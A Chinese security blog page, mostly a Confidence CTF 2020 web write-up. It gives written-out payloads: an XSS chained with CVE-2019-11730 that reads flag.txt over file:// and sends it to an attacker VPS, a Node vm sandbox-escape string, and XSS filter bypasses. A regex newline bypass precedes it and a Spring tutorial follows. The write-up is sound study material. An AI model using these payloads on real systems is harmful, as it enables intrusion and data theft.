<h4 id="一个常见的绕过"><a href="#一个常见的绕过" class="headerlink" title="一个常见的绕过"></a>一个常见的绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^want$/'</span>, $_GET[<span class="string">'exp'</span>]) &amp;&amp; $_GET[<span class="string">'exp'</span>] !== <span class="string">'want'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于这个过滤条件 我们可以用exp=want%0a进行绕过</p>
<p>原理为$可以对换行符进行匹配</p>
<p>同样的漏洞还有Apache换行解析漏洞，也就是shell.php\n可以以php的形式解析，也是利用了$可以匹配换行符导致的。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" data-id="ckabsu39a003ykkvrg0bhcz7p" class="article-share-link" data-share="baidu" data-title="正则与经典写配置漏洞学习">Share</a>
      

      
        <a href="http://yoursite.com/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Confidence-CTF-2020-Web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/18/Confidence-CTF-2020-Web/" class="article-date">
  <time datetime="2020-03-18T11:46:11.000Z" itemprop="datePublished">2020-03-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/18/Confidence-CTF-2020-Web/">Confidence CTF 2020-Web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="Catweb"><a href="#Catweb" class="headerlink" title="Catweb"></a>Catweb</h4><p>先看一下题目的js代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewCats</span>(<span class="params">kind</span>) </span>&#123;</span><br><span class="line">			$.getJSON(<span class="string">'http://catweb.zajebistyc.tf/cats?kind='</span>+kind, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(data.status != <span class="string">'ok'</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$(<span class="string">'#cats_container'</span>).empty();</span><br><span class="line">				cats = data.content;</span><br><span class="line">				cats.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>) </span>&#123;</span><br><span class="line">					<span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">					newDiv.innerHTML = <span class="string">'&lt;img style="max-width: 200px; max-height: 200px" src="static/'</span>+kind+<span class="string">'/'</span>+cat+<span class="string">'" /&gt;'</span>;</span><br><span class="line">					$(<span class="string">'#cats_container'</span>).append(newDiv);</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			$(<span class="string">'#cat_select'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">				<span class="keyword">var</span> kind = $(<span class="keyword">this</span>).val();</span><br><span class="line">				history.pushState(&#123;&#125;, <span class="string">''</span>, <span class="string">'?'</span>+kind)</span><br><span class="line">				getNewCats(kind);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(kind == <span class="string">""</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				kind = <span class="string">'black'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			getNewCats(kind);</span><br><span class="line">		&#125;);</span><br></pre></td></tr></table></figure>

<p>在getNewCats函数中通过返回的json数据渲染div标签中的img图像，默认为黑色🐱，通过切换不同的颜色来渲染出不同🐱🐱的颜色。</p>
<p>很容易发现有目录穿越这个漏洞，并且可以通过目录穿越发现flag位于/templates/flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D;..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回结果：</span><br><span class="line">&#123;</span><br><span class="line">status: &quot;ok&quot;,</span><br><span class="line">content: [</span><br><span class="line">&quot;prestart.sh&quot;,</span><br><span class="line">&quot;uwsgi.ini&quot;,</span><br><span class="line">&quot;main.py&quot;,</span><br><span class="line">&quot;templates&quot;,</span><br><span class="line">&quot;static&quot;,</span><br><span class="line">&quot;app.py&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有另一个report通过，可以把url发给后台的bot 并且bot会不加任何验证的进行点击操作</p>
<p>比如我们发一个</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:location=<span class="string">"http://139.224.236.99:8787"</span></span><br></pre></td></tr></table></figure>

<p>即可在自己的vps上监听到bot的请求</p>
<p>浏览完整个功能点后 回到第一个功能点可以发现可以进行json注入</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8wF8UA.png" alt="8wF8UA.png"></p>
<p>那么就意味着我们直接控制回显字段了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img style&#x3D;&quot;max-width: 200px; max-height: 200px&quot; src&#x3D;&quot;static&#x2F;&#39;+kind+&#39;&#x2F;&#39;+cat+&#39;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>xss poc 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&#x2F;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;poc&quot;:&quot;</span><br></pre></td></tr></table></figure>

<p>其实这里我也比较好奇后台是怎么去检测这个路径的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..可以正常返回 而..&#x2F;xx&#x2F;..却不行</span><br><span class="line">但是..的逻辑实际上是等于..&#x2F;xx&#x2F;..的</span><br><span class="line">如果xx的形式可以的话 我们就用了另一种攻击方式 可以在kind处进行xss闭合</span><br><span class="line">emm 对这点同样有思考的师傅欢迎来一起讨论</span><br></pre></td></tr></table></figure>

<p>现在我们要做的是结合这个xss页面以及bot的点击将templates/flag.txt的内容带出</p>
<p>这里就用 <strong>CVE-2019-11730</strong> 这个漏洞</p>
<p><a href="https://github.com/alidnf/CVE-2019-11730" target="_blank" rel="noopener">POC及攻击视频</a></p>
<p>大概浏览下poc.html 可以得知这个CVE的攻击思路为通过当前location的file协议读取当前目录下的文件</p>
<p>部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (location.protocol != <span class="string">"file:"</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"- Error: File isn't loaded locally!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Use Clickjacking to trick the victim to click name of current file name in the hidden iframe.</span></span><br><span class="line">    <span class="comment">// First, Create a hidden iframe pointing to the parent directory.</span></span><br><span class="line">    <span class="keyword">var</span> exploit_iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    exploit_iframe.src = <span class="string">"./"</span>;</span><br><span class="line">    exploit_iframe.className = <span class="string">"exploit_iframe"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(exploit_iframe);</span><br><span class="line">    <span class="comment">// Second, Create a fake button and trick the user to click it.</span></span><br><span class="line">    <span class="keyword">var</span> fake_button = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">    fake_button.className = <span class="string">"fake_button"</span>;</span><br><span class="line">    fake_button.innerText = <span class="string">"Click Me! I have a gift for you!"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(fake_button);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过exploit iframe以及button click完成二次触发load和Bypass SOP</p>
<p>那么攻击思路就很明显了</p>
<ul>
<li>由于都是静态页面 file:///app/templates/index.html等价于catweb.zajebistyc.tf。</li>
<li>发送给后台bot file:///协议的payload 并且加上我们自己的js</li>
<li>后台点击触发</li>
</ul>
<p>Payload如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///app/templates/index.html?", "status": "ok", "content":["a\"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;location.href=<span class="string">'http://vps?q='</span>+<span class="built_in">encodeURIComponent</span>(btoa(xhr.responseText))&#125;; xhr.open(<span class="string">'GET'</span>, <span class="string">'flag.txt'</span>, <span class="literal">false</span>); xhr.send();  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"], "poc": "</span><br></pre></td></tr></table></figure>

<h3 id="temple-js"><a href="#temple-js" class="headerlink" title="temple-js"></a>temple-js</h3><p>通过这道题确实学到了很多</p>
<p>题目源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>)</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>)</span><br><span class="line"><span class="keyword">const</span> watchdog = <span class="built_in">require</span>(<span class="string">"./watchdog"</span>);</span><br><span class="line"></span><br><span class="line">global.flag = fs.readFileSync(<span class="string">"flag"</span>).toString()</span><br><span class="line"><span class="keyword">const</span> source = fs.readFileSync(__filename).toString()</span><br><span class="line"><span class="keyword">const</span> help = <span class="string">"There is no help on the way."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'public'</span>))</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/repl'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> sandbox = vm.createContext(&#123;<span class="attr">par</span>: (<span class="function"><span class="params">v</span> =&gt;</span> <span class="string">`(<span class="subst">$&#123;v&#125;</span>)`</span>), source, help&#125;)</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/^[a-zA-Z0-9 $&#123;&#125;`]+$/g</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> command = req.body[<span class="string">'cmd'</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&gt; <span class="subst">$&#123;command&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(validInput.test(command))</span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="keyword">let</span> watch = watchdog.schedule()</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = vm.runInContext(command, sandbox, &#123;</span><br><span class="line">                    timeout: <span class="number">300</span>,</span><br><span class="line">                    displayErrors: <span class="literal">false</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                watchdog.stop(watch)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid input."</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ex)</span><br><span class="line">    &#123;</span><br><span class="line">        response = ex.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&lt; <span class="subst">$&#123;response&#125;</span>`</span>)</span><br><span class="line">    res.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"response"</span>: response&#125;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Listening on :<span class="subst">$&#123;port&#125;</span>...`</span>)</span><br><span class="line">app.listen(port, <span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>代码量比较少，大意是逃逸掉沙箱拿到沙箱外定义的flag</p>
<p>对于沙箱逃逸：</p>
<p>我们可以通过constructor.constructor返回的Function来返回我们的flag</p>
<p>通过constructor.constructor拿到的Function为沙箱外的Function</p>
<p>首先来看一个例子</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8013RO.png" alt="8013RO.png"></p>
<p>我们可以直接通过Function来定义一个任意内容的函数，第三种函数的定义用到了标签模板字符串</p>
<p>下图为给的例子</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8BRleH.png" alt="8BRleH.png"></p>
<p>对应我们例子中的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ƒ anonymous(a,</span><br><span class="line">) &#123;</span><br><span class="line"><span class="number">49</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>template String作为最后一个参数传入函数体内 成为我们自定义的函数内容，而a则作为此函数的参数。</p>
<p>那么接下来就可以写一个返回沙箱外函数的anoymous了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">'return constructor.constructor'</span>&#125;</span>`</span><span class="string">``</span><span class="string">``</span> </span><br><span class="line"><span class="comment">// or ``</span></span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>不过我们输入的字符被正则限制了，不能有.这个字符，不过可以直接用</p>
<p>with条件进行代替，并且不允许有()，那我们可以用sandbox中的par函数来返回(constructor)来bypass这个正则，最终payload为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">`with<span class="subst">$&#123;par<span class="string">`construtor`</span>&#125;</span>return constructor`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>再进行此anoymos函数的调用就可以获得Function了，然后再通过这个Function来返回沙箱外的flag.最后上个图：</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8B5OwF.png" alt="8B5OwF.png"></p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>用Function配和template String进行xss同样是很棒的攻击手法：</p>
<p>比如下面的Payload(tw上看到的)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="built_in">unescape</span>. call<span class="string">`<span class="subst">$&#123;location&#125;</span>`</span>&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结合在url中输入%0aalert()&#x2F;&#x2F;即可实现xss</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">&#x2F;&#x2F;拆分字母Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;return &#96;+&#96;aler&#96;+&#96;t(1)&#96;&#125;&#96;</span><br><span class="line">&#x2F;&#x2F;字符编码Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;\x61\x6c\x65\x72\x74\x28\x29&#96;&#125;</span><br></pre></td></tr></table></figure>


<pre><code></code></pre>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/03/18/Confidence-CTF-2020-Web/" data-id="ckabsu37x000pkkvr4ugqf4zs" class="article-share-link" data-share="baidu" data-title="Confidence CTF 2020-Web">Share</a>
      

      
        <a href="http://yoursite.com/2020/03/18/Confidence-CTF-2020-Web/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Spring漏洞分析系列-一-Spring框架基础与Spring反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2020-03-06T07:32:31.000Z" itemprop="datePublished">2020-03-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="SpringMVC基础知识"><a href="#SpringMVC基础知识" class="headerlink" title="SpringMVC基础知识"></a>SpringMVC基础知识</h3><h4 id="Spring介绍"><a href="#Spring介绍" class="headerlink" title="Spring介绍"></a>Spring介绍</h4><blockquote>
<p>Spring是一个轻量级的Java Web开发框架，是分层的Java SE/EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p>
</blockquote>
<h4 id="spring调用的基本流程"><a href="#spring调用的基本流程" class="headerlink" title="spring调用的基本流程"></a>spring调用的基本流程</h4><p>1.发起请求到前端控制器(DispatcherServlet)<br>        2.前端控制器请求处理器映射器(HandlerMapping)查找Handler(可根据xml配置、注解进行查找)<br>        3.处理器映射器(HandlerMapping)向前端控制器返回Handler<br>        4.前端控制器调用处理器适配器(HandlerAdapter)执行Handler<br>        5.Handler执行完，给适配器返回ModelAndView(Springmvc框架的一个底层对象)<br>        6.处理器适配器(HandlerAdapter)向前端控制器返回ModelAndView<br>        7.前端控制器(DispatcherServlet)请求视图解析器(ViewResolver)进行视图解析，根据逻辑视图名解析成真正的视图(jsp)<br>        8.视图解析器(ViewResolver)向前端控制器(DispatcherServlet)返回View<br>        9.前端控制器进行视图渲染，即将模型数据(在ModelAndView对象中)填充到request域<br>        10.前端控制器向用户响应结果</p>
<h3 id="Spring-IoC思想"><a href="#Spring-IoC思想" class="headerlink" title="Spring IoC思想"></a>Spring IoC思想</h3><p>IoC思想的作用：主要可通过IoC写出松耦合，更优良的程序。</p>
<p>在之前的编程中，当我们当前的类依赖另一个类的时候，我们会在这个类的内部去主动创建所依赖的类，从而会导致类之间的高耦合。</p>
<p>而在Spring 框架中：有了IoC容器，容器会自动帮我们去查找以及注入所依赖对象，对象不再是去主动创建所依赖的类，而是被动的接受所依赖的类，并且new实例工作不由程序来做而是交给Spring容器去做，这也就是为什么IoC叫做控制反转的原由。</p>
<p>Spring提供了两种IoC容器，分别为BeanFactory和ApplicationContext。</p>
<ul>
<li>BeanFactory：<br>BeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。</li>
<li>ApplicationContext：<br>ApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展：<br>1.MessageSource, 提供国际化的消息访问<br>2.资源访问（如URL和文件）<br>3.事件传递<br>4.Bean的自动装配<br>5.各种不同应用层的Context实现</li>
</ul>
<p>在现在的开发工作中，都会尽可能的使用ApplicationContext而非BeanFactory</p>
<h4 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h4><p>BeanFactory的类体系结构</p>
<p><img src="https://s2.ax1x.com/2020/03/05/37z6bt.png" alt="37z6bt.png"></p>
<p>而BeanFactory最常用的API为XmlBeanFactory</p>
<p>Demo略</p>
<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>ApplicationContext类体系：</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3HFZz8.png" alt="3HFZz8.png"></p>
<p>ApplicationContext 最常用接口：</p>
<ul>
<li><strong>FileSystemXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。在这里，你需要提供给构造器XML文件的绝对路径；</li>
<li><strong>ClassPathXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。无需提供XML文件的完整路径，只需正确配置CLASSPATH环境变量即可，因为容器会从CLASSPATH中搜索Bean配置文件；</li>
<li><strong>WebXmlApplicationContext</strong>：该容器会在一个Web应用程序的范围内加载在XML文件中已被定义的 bean；</li>
</ul>
<p>Demo略</p>
<h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><p>在获取ApplicationContext实例后，就可以像BeanFactory一样调用getBean(beanName)返回Bean了。ApplicationContext的初始化和BeanFactory有一个重大的区别：BeanFactory在初始化容器时，并未实例化Bean,直到第一次访问某个Bean时才实例化目标Bean；而ApplicationContext则在初始化应用上下文时就实例化所有单实例的Bean。</p>
<h4 id="依赖注入-DI"><a href="#依赖注入-DI" class="headerlink" title="依赖注入(DI)"></a>依赖注入(DI)</h4><blockquote>
<p>当某个Java实例需要另一个Java实例时，传统的方法是由调用者创建被调用者的实例（例如，使用new关键字获得被调用者实例），而使用Spring框架后，被调用者的实例不再由调用者创建，而是由Spring容器创建，这称为控制反转。Spring容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过Spring容器获得被调用者实例，这称为依赖注入。</p>
</blockquote>
<p>而Spring 正是通过这种依赖注入来管理Bean对象之间的依赖关系</p>
<p>依赖注入主要实现的两种方法有setter和构造方法注入：</p>
<h5 id="setter方法的依赖注入"><a href="#setter方法的依赖注入" class="headerlink" title="setter方法的依赖注入"></a>setter方法的依赖注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> String msg;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(String msg)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"helloBean"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.spring.demo.HelloWorld"</span>&gt;    </span><br><span class="line">       &lt;property name=<span class="string">"msg"</span> value=<span class="string">"Hello World!"</span>/&gt;    </span><br><span class="line"> &lt;/bean&gt;</span><br></pre></td></tr></table></figure>

